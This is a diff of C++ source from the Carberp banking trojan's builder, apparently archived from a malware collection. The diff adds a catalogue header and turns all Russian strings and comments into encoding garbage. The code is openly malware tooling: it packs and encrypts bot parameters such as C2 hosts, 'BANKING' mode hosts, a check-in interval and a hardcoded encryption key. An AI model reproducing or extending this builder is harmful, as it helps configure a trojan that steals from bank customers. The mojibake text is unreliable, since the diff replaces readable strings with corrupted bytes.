@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 //---------------------------------------------------------------------------
 
 
@@ -29,45 +40,45 @@ const PCHAR KeyForKey = "AUvS8jou0Z9K7Bf9";
 
 
 
-PCHAR Error_UnknownMae = "Не указано имя";
-PCHAR Error_MemAlloc = "Ошибка выделения памяти!";
-PCHAR Error_NoSourceFile = "Исходный файл не открыт!";
-PCHAR Error_BigParamDataSize = "Попытка прочитать слишком большой блок данных для параметра";
-PCHAR Error_InvalidParamsFile = "Файл не фвляется файлом параметров или содержит ошибку!";
-PCHAR Error_UnknownResultFileName = "Не указано имя конечного файла";
-PCHAR Error_DataSizeError = "Попытка записать слишком большой блок данных";
-PCHAR Error_BigPassword = "Слишком большой ключ шифрования";
+PCHAR Error_UnknownMae = "пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ";
+PCHAR Error_MemAlloc = "пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ!";
+PCHAR Error_NoSourceFile = "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ!";
+PCHAR Error_BigParamDataSize = "пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ";
+PCHAR Error_InvalidParamsFile = "пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ!";
+PCHAR Error_UnknownResultFileName = "пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ";
+PCHAR Error_DataSizeError = "пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ";
+PCHAR Error_BigPassword = "пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ";
 
-PCHAR ParamStatus_Warning = "ПРЕДУПРЕЖДЕНИЕ: ";
-PCHAR ParamStatus_Error   = "ОШИБКА:         ";
+PCHAR ParamStatus_Warning = "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ: ";
+PCHAR ParamStatus_Error   = "пїЅпїЅпїЅпїЅпїЅпїЅ:         ";
 
-PCHAR StrNoParamValue = "Не установлено значение параметра \r\n --";
+PCHAR StrNoParamValue = "пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ \r\n --";
 
-PCHAR ParamTitle_Hosts        = "Основные хосты бота";
-PCHAR ParamTitle_BankHosts    = "Хосты режима BANKING";
-PCHAR ParamTitle_Prefix       = "Префикс бота";
-PCHAR ParamTitle_Delay        = "Интервал отстука";
-PCHAR ParamTitle_Password     = "Ключ шифрования";
+PCHAR ParamTitle_Hosts        = "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ";
+PCHAR ParamTitle_BankHosts    = "пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ BANKING";
+PCHAR ParamTitle_Prefix       = "пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ";
+PCHAR ParamTitle_Delay        = "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ";
+PCHAR ParamTitle_Password     = "пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ";
 
 
 
 // UnicodeString Status_ = "";
 UnicodeString Status_Ok = "OK";
-UnicodeString Status_Error = "ОШИБКА";
-UnicodeString Status_StartBuild = "Запуск сборки";
-UnicodeString Status_CheckParams = "Проверяем параметры";
-UnicodeString Status_WriteParams = "Записываем параметры:";
+UnicodeString Status_Error = "пїЅпїЅпїЅпїЅпїЅпїЅ";
+UnicodeString Status_StartBuild = "пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ";
+UnicodeString Status_CheckParams = "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ";
+UnicodeString Status_WriteParams = "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ:";
 UnicodeString Status_WriteParam = "====> ";
-UnicodeString Status_SaveFile = "Сохраняем файл ";
-UnicodeString Status_BuildCompleted = "Сборка успешно завершена";
+UnicodeString Status_SaveFile = "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ ";
+UnicodeString Status_BuildCompleted = "пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ";
 
 bool Builder::PackStringsToDoubleZeroEndLine(TStrings *Lines,
 									bool CryptLines, bool TrimLines,
 									PCHAR &OutBuf, DWORD &OutBufSize)
 {
-	//  функция упаковывает строки в одну строку. Каждая строка будет
-	//  отделена нулевым символом. В конце последней строки будет стоять
-	//  два нулевых символа. Пустые строки будут проигнорированы.
+	//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ. пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
+	//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ. пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+	//  пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ. пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
 	if (Lines == NULL || Lines->Count == 0)
 		return false;
@@ -79,7 +90,7 @@ bool Builder::PackStringsToDoubleZeroEndLine(TStrings *Lines,
 	UnicodeString S;
 
 
-	// Определяем длину буфера и удаляем пустые строки
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	for (int i = Lines->Count - 1; i >= 0; i--)
     {
 		S = Lines->Strings[i];
@@ -99,9 +110,9 @@ bool Builder::PackStringsToDoubleZeroEndLine(TStrings *Lines,
 	}
 	if (OutBufSize == 0) return false;
 
-	OutBufSize++; // Резервируем место для дополнительного нуля
+	OutBufSize++; // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 
-	// Собираем данные
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	OutBuf = (PCHAR)MemAlloc(OutBufSize);
 	if (OutBuf == NULL)
 	{
@@ -110,11 +121,11 @@ bool Builder::PackStringsToDoubleZeroEndLine(TStrings *Lines,
 
     PCHAR Tmp = OutBuf;
 
-	// Копируем строки
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	for (int i = 0; i < Lines->Count; i++)
     {
 		S = Lines->Strings[i];
-		// Копируем строку
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		DWORD SL = S.Length();
 		PCHAR Line = NULL;
 
@@ -131,13 +142,13 @@ bool Builder::PackStringsToDoubleZeroEndLine(TStrings *Lines,
 		if (CryptLines)
 			STR::Free(Line);
 
-		// Смещаем указатели
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		Tmp += SL;
 		*Tmp = 0;
 		Tmp++;
 	}
 
-	// Добавляем дополнительный ноль
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 	*Tmp = 0;
 
 	return true;
@@ -159,7 +170,7 @@ struct TBuilderFileHeader
 
 
 //*****************************************************************
-//  Класс базового параметров бота
+//  пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 //*****************************************************************
 TBotParam::TBotParam(TCustomBotModule* AOwner, PCHAR Name, DWORD Size, bool Encrypted, bool NotNull, PCHAR Title)
 	: TObject()
@@ -194,7 +205,7 @@ __fastcall TBotParam::~TBotParam()
 }
 
 //--------------------------------------------------
-//  Функция очищает данные
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 //--------------------------------------------------
 void TBotParam::Clear()
 {
@@ -203,7 +214,7 @@ void TBotParam::Clear()
 }
 
 //--------------------------------------------------
-//  Функция сбрасывает информацию о позиции параметра
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 //--------------------------------------------------
 void TBotParam::ResetStatus()
 {
@@ -211,8 +222,8 @@ void TBotParam::ResetStatus()
 }
 
 //--------------------------------------------------
-//  Функция обновляет информацию о наличии параметра
-//  в указанном буфере
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+//  пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 //--------------------------------------------------
 bool TBotParam::UpdateStatus(LPBYTE Buf, DWORD BufSize)
 {
@@ -221,7 +232,7 @@ bool TBotParam::UpdateStatus(LPBYTE Buf, DWORD BufSize)
 }
 
 //--------------------------------------------------
-//  Функция записывает данные парметра в буфер
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ
 //--------------------------------------------------
 bool TBotParam::Write(LPBYTE Buf, DWORD BufSize)
 {
@@ -233,7 +244,7 @@ bool TBotParam::Write(LPBYTE Buf, DWORD BufSize)
 }
 
 //--------------------------------------------------
-//  Функция реальной записи значение параметра в поток
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ
 //--------------------------------------------------
 void TBotParam::DoSaveToStream(TStream *Stream, LPBYTE Buf, DWORD Size)
 {
@@ -242,7 +253,7 @@ void TBotParam::DoSaveToStream(TStream *Stream, LPBYTE Buf, DWORD Size)
 }
 
 //--------------------------------------------------
-//  Функция сохраняет значение параметра в поток
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ
 //--------------------------------------------------
 void TBotParam::SaveToStream(TStream *Stream)
 {
@@ -250,8 +261,8 @@ void TBotParam::SaveToStream(TStream *Stream)
 }
 
 //--------------------------------------------------
-//  Функция реальной загрузки значения параметра из
-//  потока
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ
+//  пїЅпїЅпїЅпїЅпїЅпїЅ
 //--------------------------------------------------
 void TBotParam::DoLoadFromStream(TStream *Stream, LPBYTE &Buf, DWORD &Size)
 {
@@ -267,7 +278,7 @@ void TBotParam::DoLoadFromStream(TStream *Stream, LPBYTE &Buf, DWORD &Size)
 }
 
 //--------------------------------------------------
-//  Функция загружает значение параметра из потока
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 //--------------------------------------------------
 void TBotParam::LoadFromStream(TStream *Stream)
 {
@@ -289,7 +300,7 @@ void TBotParam::LoadFromStream(TStream *Stream)
 }
 
 //--------------------------------------------------
-//  Функция возвращает истину если парметр активен
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 //--------------------------------------------------
 bool TBotParam::GetActive()
 {
@@ -297,8 +308,8 @@ bool TBotParam::GetActive()
 }
 
 //--------------------------------------------------
-//  Функция возвращает истину если парметр
-//  динамический
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 //--------------------------------------------------
 bool TBotParam::GetIsDynamic()
 {
@@ -308,7 +319,7 @@ bool TBotParam::GetIsDynamic()
 
 
 //--------------------------------------------------
-//  Функция возвращает состояние значения парметра
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 //--------------------------------------------------
 TBotParamStatus TBotParam::ValueStatus()
 {
@@ -327,7 +338,7 @@ TBotParamStatus TBotParam::ValueStatus()
 
 
 //--------------------------------------------------
-//  Функция устанавливает значение параметра
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 //--------------------------------------------------
 void TBotParam::SetValue(LPVOID Data, DWORD Size, bool Encrypt)
 {
@@ -344,7 +355,7 @@ void TBotParam::SetValue(LPVOID Data, DWORD Size, bool Encrypt)
 }
 
 //--------------------------------------------------
-//  Функция возвращает данные параметра как строку
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 //--------------------------------------------------
 AnsiString TBotParam::GetAsString()
 {
@@ -355,8 +366,8 @@ AnsiString TBotParam::GetAsString()
 }
 
 //--------------------------------------------------
-//  Функция устанавливает значение параметра из
-//  строки
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ
+//  пїЅпїЅпїЅпїЅпїЅпїЅ
 //--------------------------------------------------
 void TBotParam::SetAsString(const AnsiString& Value)
 {
@@ -364,8 +375,8 @@ void TBotParam::SetAsString(const AnsiString& Value)
 }
 
 //--------------------------------------------------
-//  Функция возвращает значение ка многострочный
-//  текст
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+//  пїЅпїЅпїЅпїЅпїЅ
 //--------------------------------------------------
 AnsiString TBotParam::GetAsMultiLine()
 {
@@ -381,8 +392,8 @@ AnsiString TBotParam::GetAsMultiLine()
 }
 
 //--------------------------------------------------
-//  Функция устанавливает значение из многострочного
-//  текст
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+//  пїЅпїЅпїЅпїЅпїЅ
 //--------------------------------------------------
 void TBotParam::SetAsMultiLine(const AnsiString& Value)
 {
@@ -399,25 +410,25 @@ void TBotParam::SetAsMultiLine(const AnsiString& Value)
 			DWORD Len = Str.Length();
 			if (Len == 0) continue;
 
-			Len++;// Цепляем ноль в конце
+			Len++;// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ
             Sz += Len;
 
-			// Проверяем размер с учётом того, что в конце должно
-			// стоять два нуля
+			// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ, пїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+			// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 			if (Sz > FSize - 1)
 				throw Exception(Error_DataSizeError);
 
-			// Шифруем строку
+			// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 			if (FEncrypted)
 				DecryptStr(Str.c_str(), Str.c_str());
 
-			// Копируем данные
+			// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 			m_memcpy(Tmp, Str.c_str(), Len);
 
 			Tmp += Len;
 		}
 
-        // Устанавливаем значение
+        // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
         SetValue(Buf, Sz, false);
 
 	} catch (...) {
@@ -429,7 +440,7 @@ void TBotParam::SetAsMultiLine(const AnsiString& Value)
 
 
 //--------------------------------------------------
-//  Функция возвращает значение параметра как DWORD
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ DWORD
 //--------------------------------------------------
 DWORD TBotParam::GetAsLong()
 {
@@ -440,7 +451,7 @@ DWORD TBotParam::GetAsLong()
 }
 
 //--------------------------------------------------
-//  Функция устанавливает значение параметра как DWORD
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ DWORD
 //--------------------------------------------------
 void TBotParam::SetAsLong(DWORD Value)
 {
@@ -448,7 +459,7 @@ void TBotParam::SetAsLong(DWORD Value)
 }
 
 //--------------------------------------------------
-//  Функция возвращает значение параметра как bool
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ bool
 //--------------------------------------------------
 bool TBotParam::GetAsBool()
 {
@@ -456,7 +467,7 @@ bool TBotParam::GetAsBool()
 }
 
 //--------------------------------------------------
-//  Функция устанавливает значение параметра как bool
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ bool
 //--------------------------------------------------
 void TBotParam::SetAsBool(bool Value)
 {
@@ -464,8 +475,8 @@ void TBotParam::SetAsBool(bool Value)
 }
 
 //--------------------------------------------------
-//  Функция проверяет правильно ли записался параметр
-//  в буфер
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+//  пїЅ пїЅпїЅпїЅпїЅпїЅ
 //--------------------------------------------------
 bool TBotParam::CheckParam(LPBYTE Buf, LPBYTE OriginalBuf)
 {
@@ -473,9 +484,9 @@ bool TBotParam::CheckParam(LPBYTE Buf, LPBYTE OriginalBuf)
 	if (FPosition < 0)
 		return false;
 
-	// По умолчанию считаем, что параметр является
-	// строковым параметром и, до окончания его
-	// положения, должен стоять нудевые символ
+	// пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ, пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 
 	LPBYTE Ptr = Buf + FPosition;
 	Ptr += FSize - 1;
@@ -488,7 +499,7 @@ bool TBotParam::CheckParam(LPBYTE Buf, LPBYTE OriginalBuf)
 
 
 //*****************************************************************
-//  Класс основного пароля бота
+//  пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 //*****************************************************************
 TMainPassword::TMainPassword(TCustomBotModule* AOwner, PCHAR Name, DWORD Size, bool Encrypted, bool NotNull, PCHAR Title)
 	:TBotParam(AOwner, Name, Size, Encrypted, NotNull, Title)
@@ -501,7 +512,7 @@ __fastcall TMainPassword::~TMainPassword()
 }
 
 //--------------------------------------------------
-//  Функция возвращает пароль в зашифрованном виде
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 //--------------------------------------------------
 AnsiString TMainPassword::GetAsString()
 {
@@ -509,7 +520,7 @@ AnsiString TMainPassword::GetAsString()
 }
 
 //--------------------------------------------------
-//  Функция устанавливает пароль в зашифрованном виде
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 //--------------------------------------------------
 void TMainPassword::SetAsString(const AnsiString& Value)
 {
@@ -527,7 +538,7 @@ void TMainPassword::SetAsString(const AnsiString& Value)
 
 
 //--------------------------------------------------
-//  Функция устанавливает пароль в зашифрованном виде
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 //--------------------------------------------------
 void TMainPassword::DoSaveToStream(TStream *Stream, LPBYTE Buf, DWORD Size)
 {
@@ -535,7 +546,7 @@ void TMainPassword::DoSaveToStream(TStream *Stream, LPBYTE Buf, DWORD Size)
 }
 
 //--------------------------------------------------
-//  Функция устанавливает пароль в зашифрованном виде
